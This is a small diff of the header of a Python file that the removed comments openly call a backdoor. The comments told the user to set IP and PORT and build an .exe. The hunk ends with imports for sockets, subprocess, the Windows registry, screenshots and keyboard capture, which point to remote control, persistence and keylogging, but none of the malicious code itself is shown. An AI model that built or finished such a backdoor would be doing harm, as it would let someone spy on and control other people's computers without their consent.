@@ -6,13 +6,7 @@
 #email: rossiniroberto52@gmail.com
 #twitter: @rossin135
 
-########################################################
-#                         hints                        #
-# create a .exe file after change the IP and PORT vars #
-#        this backdoor just work in local network      #
-########################################################
-
-#github: https://github.com/rossiniroberto52
+#github: https://github.com/rossiniroberto52/backdoor.git
 import socket, os, subprocess, webbrowser, shutil, winreg
 from PIL import ImageGrab
 from pynput.keyboard import Key as key
